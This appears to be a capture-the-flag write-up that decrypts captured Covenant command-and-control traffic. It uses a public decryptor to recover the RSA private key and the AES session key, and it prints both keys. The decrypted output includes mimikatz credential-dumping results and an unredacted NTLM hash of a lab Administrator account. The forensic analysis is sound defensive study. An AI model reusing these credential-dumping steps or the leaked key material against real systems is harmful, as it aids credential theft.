<img width="1227" height="924" alt="image" src="https://github.com/user-attachments/assets/3b6bbbcb-93df-4817-8f0f-1ee1cd99d2a1" />


Covenant is an open-source, API-driven .NET Command and Control (C2) framework. 

I was also able to find a Decryptor.

https://github.com/naacbin/CovenantDecryptor

```html
<RSAKeyValue><Modulus>uu9b7lb3AED0j5r+qW4SDYlC0LZLPF5crPx9lkWafZZ+FDK2HuKnEtqjb9Xu8XEtc6Gb4dIi4DVGAjSKCpPBSvzrmBi/nqQbkuBVlzbv1l7lqZEYtL4z8N58YGrUuh2jeyKKtIfDJlUy5zT1Eer7xyKbykq8xP16tGXZe8Xb+oocmb72DPoH4mvnV1b+Q7JYE68gHSqgbOURy7jVecg8ragwdUNjvo3y2krQOdRRE/zuds+0I9abE26la+GnRw0C8qNnX4xGpoVlMiqiQoaiZoUSmODNkK7L3Ye6v++hM7Gyrl8fvbC5jlF7dSjjX9m/I1mZPkzrIbVk9cUdaWJVXQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
```

<img width="2222" height="947" alt="image" src="https://github.com/user-attachments/assets/c21dbf57-dee7-4b6b-91c4-ab0b540a4f84" />


<img width="571" height="100" alt="image" src="https://github.com/user-attachments/assets/c2645b14-4618-4ded-ac94-3f6251e3e2a4" />


<img width="1449" height="777" alt="image" src="https://github.com/user-attachments/assets/9b01319b-0242-46a5-976d-9242ae394282" />


```html
l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=
```

to use the decrypt script. 

```html
python3 decrypt_covenant.py modulus -i test -k "l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=" -t base64
```

Test File

```html
i=a19ea23062db990386a3a478cb89d52e&data=eyJHVUlEIjoiNTZmMjM2ZTUyMDlkZmFhNTNhYWEiLCJUeXBlIjowLCJNZXRhIjoiIiwiSVYiOiIzVFhPWm1hNG90bDFOUHI3cDJaZ0JBPT0iLCJFbmNyeXB0ZWRNZXNzYWdlIjoidXRSb0E5SWZsR3BNNS8ySUZDSURwVW1QNU1GMWJwTWwyQ3ZEVU5VcSt5TEhrZTBTQVJXQWlWMjM4ZVdyays1TUdEMkZhY0xFWDhhdFdyMHJPQzY3YzJWZWlNL09TK3NTN2EvamJQRGZxbW1XTEZlZ0s3MG9JZHgxQzlrN0tJV1RIeVJxZndRbTN1TCtUdkJCM0ZEUkUwWGtNbnRRL3F6ZkdWYUNYL3ZtSmRhbEh3b0w3dU1WYkNDakR2c2hIeVRMeEFpQUFlSHV5bThCK1RDUUFWQkdEMjBpS29mVzFvcUw4ZDg3WCtXR3pqOENJUWFHSkI5aWt4UG9ISE5wTTNndW9IWkxCTmxmN1dVMmlPem1NUzE5NjE2RzRtR1lOTVFXWU01T2VXOEFxTnIrd2VzbXpSWGdMbUFNSFFKdzB5Z25uazgzY1psZFlUK2dsRUhuZi9jNkkrTER1WFMzeXBnU29GY3dSeTJ0TVdSZmpaMjErMjUvNVdCSUE4MUFJeFF1b0pSd3pEZUJsYVR3RTNkZGhMaFg1T1FldGE2aW4xNWtuQTkwY3N1akl5VFJHTG4rWlZyK293Qks3MjdJSTJNSUIxNXBwWUNHVGkvcGxRT3c0ME5oZGF4aGVOemxpWjRGU0FUd0lHN3l6eU5yTm5ZbnFhcEVLSC9peWJLLzdlNGVuTkNTclp1ZkFLalRsV3NLQStBM3VqZ2Q1NU5BSTFwTEtaemhkY1pOcVl3PSIsIkhNQUMiOiJuRUxSSldRMDh6d2NCdW00QzJWbHVSaDN5bmpnNzY5TWM2WTcrSmszRGo4PSJ9&session=75db-99b1-25fe4e9afbe58696-320bea73POST 
```

the result form the script is 

```html
[+] Modulus: 
23598357097748257459001522193279615790098243077434211990285035650037416854557487153041543839145873504364661260258258145982196047593600838968159942365710600229632038220683588355292857269827627629441531340138232479903170003517767232123855669480549375585351505061932112537018789849920931902515457411383729548626578732241492884821081722304066739713444522472711666829494339384950114089265103461609246287186252423812353162901012416073979549058886567219773030354506671620340699367692331670894450508006473829709777633739780055057830160764952533106717565747524530416092939471839209977509379614466680479399437631716767966582109
[+] Exponent: 65537

```

<img width="1377" height="174" alt="image" src="https://github.com/user-attachments/assets/e77018d4-b0b2-4326-b0ed-7393653c0f61" />


now to extract the key 

<img width="1428" height="166" alt="image" src="https://github.com/user-attachments/assets/ffd29313-414f-45d7-87dd-fb0cce697ace" />


looking at the privatekey.pem 

```html
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAuu9b7lb3AED0j5r+qW4SDYlC0LZLPF5crPx9lkWafZZ+FDK2
HuKnEtqjb9Xu8XEtc6Gb4dIi4DVGAjSKCpPBSvzrmBi/nqQbkuBVlzbv1l7lqZEY
tL4z8N58YGrUuh2jeyKKtIfDJlUy5zT1Eer7xyKbykq8xP16tGXZe8Xb+oocmb72
DPoH4mvnV1b+Q7JYE68gHSqgbOURy7jVecg8ragwdUNjvo3y2krQOdRRE/zuds+0
I9abE26la+GnRw0C8qNnX4xGpoVlMiqiQoaiZoUSmODNkK7L3Ye6v++hM7Gyrl8f
vbC5jlF7dSjjX9m/I1mZPkzrIbVk9cUdaWJVXQIDAQABAoIBAQCgb8RP13WgUx9S
jO0aDy0RTwf4RyxlQHt7wCwtJ8nDFcFZpnhmI5LO/LUey9aKg99FiaNW+doS4cYX
KG59S3iu2kl9PWhgSGqd8UmkQXMwYjvr/2rb3Q6JIPpQaf/vSHbBvNCcxpQ3txG8
G9hlq26x50McKG7BBugkIfG5aAQ3jo+7DOedGb9I3orPKup9GGx1QnXqlDgDO1oT
QAmVju9k0TFsIKR7euFZD7QIExVMWKzrzLQoIRTNsCyafWJciShMoy70EBG3KVvd
agj6r/Y7T/iTOk8mzLG0wC1LHjGwWlxjurqG3TagqP39w1t2EDAWAOBgCD+f9LSy
vqkNCERFAoGBAOUjVb399FqU1dR/plSusxXdIkszUBc/T1iCvLmaeCUouqCn4jFp
8905TnFeffTUmpUTqtdlOHA/XTg7R++KeN8nurA8nEG7KzKo0Zs/BCMLwgD1uPdk
xpN/fo43q6sk9EGG01iw1Al3aoXWXxaNRSdpZcj89jLT0EYIV9o9xLQ7AoGBANDZ
d+Th9k4neoDCUXRH88JocBkjWtci2wxwrTiUXQSXXzeQTy8ihrghcpLFQhm+7UhX
HdEmBNrxrw+zt0ZfM2NMcDmFxSapevG8QU7590D0SGRoR6Kb1a9NIMptL++jPvOz
Vx4BdkxhBKZHErBiQS8Tg5ye22ziA0QYp2gn9HtHAoGAaQsV14+AYbYxgMU0H0Yn
WzKQ8iCH6uBfI5hrpDqoMYDGbbgI/dYwsY3/5AEJhR+h7g2iGDSS9wJVXd3vUGUO
nF6+OuTOTWPcndC+pojxAI/3VDFRpjhQwHWGMvRago7iWtfQM6x8yAoyj0CDPvds
aHDs9ILi6tInfLN+ctI2RtkCgYEAvcoiLhk532P46zGrG+SXG8AUvoNmdcLzFKcA
gz4wGZAFs1Ss4MSbcJDUsZQYsZTTxL2GFx5Zoy2mTLqgfo7dAAvioCN0OeIiG7Nc
Fg0KKDjV4IjzME41LY0Fk28N9NOAza3YKShi/J3dv80uqqNfYQx2ucmS1au+FA/j
cb99aNkCgYEAvtrh1ZrMK86XCAy4XW9Xe+bxFPMmRqHxJClbqgR9ZB/uM/LFjS5S
paktUp3jlv61+E2AOIAbHFGM6zys0Bmc6bNwfNFuRsE+JRYb/PRHZGE9EBS0Vbs0
euo39HXAByl6QZotqxpIDk62nVJMTyfEs2RdThb3GHtJX2sD5aD8Qm0=
-----END RSA PRIVATE KEY-----
```

now for the AES KEY 

```html
python3 decrypt_covenant.py key -i request.txt -k "l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=" -t base64 -r ./output_key/privkey1.pem
```

<img width="1616" height="147" alt="image" src="https://github.com/user-attachments/assets/80b02463-dc82-4479-8e4a-4d271867ddac" />


```html
17cd8c53d0b0646186818913c140a201bb5cafee871e9e61ad94cb56614b2751
```

request.txt

```html
eyJHVUlEIjoiOWRmYWE1M2FhYSIsIlR5cGUiOjEsIk1ldGEiOiIiLCJJViI6IjRDYUJkYXFCWTVHSGRjMCtsS2N5QUE9PSIsIkVuY3J5cHRlZE1lc3NhZ2UiOiIvdGcxYXBJWGNER1h4c3VEQmgzb3RBSTFYa2R1NVkzZi9uYjBxQXJoSmpMa0VqZ3pQMXpEY3V4Tm1OWW9lMDMxTlFvd0dDcXovVlBhM280T2t1SjE4dnZYNFc5UmFMMkE1Znk5eDhrMHpPS0ltUU1INVFOM3pNTlFBTXNlY0JzUlpDNk0zMG41YmYyVi9GcmcvRXdHazhPdFNveEF1RzNrdnQ4Rmt6eHBQTmt2cXJ5RXdSTnNCUEF3TlU3MFpobWNIcEZ6bzVwTGpad2dTNzlqWE9uSUh0RTBJN2pBM3FmV0RDOEcxVmNRQi9yZDRjY2RuREdSY281SWxIWHdPUmgzTitoem1tYVhrQVBYYmhzL3d0S2lvdEhGb1B1elZEWFIxSHRlUEI1VlA5VnlYYW8zMEIrdk12NFJBU0Y0V0NNYUdPMGxYNG1DOVBJU2k0VUZVOGxKQlYvbXdIWnRWQ3MxM2ZZT0Q4UGxLaEU9IiwiSE1BQyI6InBPWm1DWnltZWQreGV3MUNuUlJJZTVJWHFPZDRiT1BLaFE4aVBmbCszSGs9In0=
```

the result from the script.

```html
[+] New AES key : 17cd8c53d0b0646186818913c140a201bb5cafee871e9e61ad94cb56614b2751
```

now, Decrypt the Covenant communication :

<img width="1464" height="78" alt="image" src="https://github.com/user-attachments/assets/fa026e00-eed1-4dca-ad49-a2651673e6c8" />


traffic_req.txt

<img width="1555" height="729" alt="image" src="https://github.com/user-attachments/assets/f6549b33-6a35-4bf7-8b9e-20e438f56957" />


result

<img width="2286" height="704" alt="image" src="https://github.com/user-attachments/assets/0af74e0a-a367-4f07-8cdb-03b088cbf6a6" />


```html
[-] Error : Padding is incorrect.
[-] Packet 8 decryption failed.
[*] Response message 15 : p"A
[*] Response message 22 : 2dSysA==
[*] Response message 34 : { "integrity": 3, "process": "powershell", "userDomainName": "EVENTHORIZON", "userName": "Administrator", "delay": 5, "jitter": 10, "connectAttempts": 5000, "status": 0, "ipAddress": "10.0.2.46", "hostname": "WIN-SKOQ4PBDU0C", "operatingSystem": "Microsoft
Windows NT 10.0.17763.0" }
[*] Response message 41 : 
[*] Response message 83 : {"status":"3","output":"EVENTHORIZON\\Administrator"}
[*] Response message 100 : {"status":"3","output":"\n  .#####.   mimikatz 2.2.0 (x64) #17763 Apr  9 2019 23:22:27\n .## ^ ##.  \"A La Vie, A L\u0027Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       \u003e 
http://blog.gentilkiwi.com/mimikatz\n \u0027## v ##\u0027       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  \u0027#####\u0027        \u003e http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(powershell) # token::elevate\nToken Id  : 0\nUser name : 
\nSID name  : NT AUTHORITY\\SYSTEM\n\n512\t{0;000003e7} 1 D 25303     \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tPrimary\n -\u003e Impersonated !\n * Process Token : {0;0003218e} 1 D 3495847   
\tEVENTHORIZON\\Administrator\tS-1-5-21-3056598854-1929938094-1148028849-500\t(18g,26p)\tPrimary\n * Thread Token  : {0;000003e7} 1 D 3586856   \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tImpersonation (Delegation)\n\nmimikatz(powershell) # lsadump::sam\nDomain : 
WIN-SKOQ4PBDU0C\nSysKey : 7d36208750229adfc967b493e2162f60\nLocal SID : S-1-5-21-2478979676-3632473970-4217322164\n\nSAMKey : 0284d0f07969f57a0b1f42fcea9af408\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: 13b1e64400203ecf38b1fdea2b11a09f\n\nRID  : 000001f5 
(501)\nUser : Guest\n\nRID  : 000001f7 (503)\nUser : DefaultAccount\n\nRID  : 000001f8 (504)\nUser : WDAGUtilityAccount\nERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH revision (0)\nERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH revision (0)\nERROR kuhl_m_lsadump_getHash ; Unknow 
SAM_HASH revision (0)\nERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH revision (0)\n"}
[*] Response message 147 : 
{"status":"2","output":"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
....
```

```html
User : Administrator
Hash NTLM: <REDACTED>
```

now for the flag.

the decrypted data in the previous step, we got three chunks of data. decoding the second chunk of data first base64 and then rendering the image we get the flag. 

<img width="1552" height="908" alt="image" src="https://github.com/user-attachments/assets/02fb1aa0-bcfe-4c6e-b34b-bc75ca37767a" />


```html
FLAG{<REDACTED>}
```
